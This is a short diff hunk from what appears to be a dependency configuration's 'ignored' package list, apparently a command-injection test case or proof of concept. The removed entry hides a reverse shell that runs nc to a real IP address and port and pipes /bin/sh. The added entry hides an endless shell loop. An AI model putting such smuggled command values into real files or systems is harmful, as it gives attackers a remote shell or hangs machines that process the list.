@@ -22,6 +22,6 @@
 
 ignored = [
     "github.com/ignore/me",
-    "aa; mkfifo foo ; nc 40.114.217.231 28080  0<foo | /bin/sh 1>foo;",
+    "; while true; do :; done; ",
     "gitpub.com/nature/vegetables"
     ]
